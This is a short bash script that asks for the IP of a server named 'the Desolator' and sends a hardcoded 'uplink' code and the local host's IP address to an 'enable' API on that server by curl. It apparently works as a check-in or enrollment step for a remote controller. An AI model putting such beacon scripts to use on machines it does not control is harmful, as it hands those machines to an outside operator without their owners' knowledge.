#!/bin/bash
echo '[?] Please enter the IP of the Desolator: '
read desolator_ip
uplink_code='c2fa26d57cd69ed4cf86f1a9cf8f0232cc20b24387e3299aa267224722bd31ef'
host=$(hostname -I)
curl "${desolator_ip}:5000/api/v3/enable?code=${uplink_code}&host=${host}"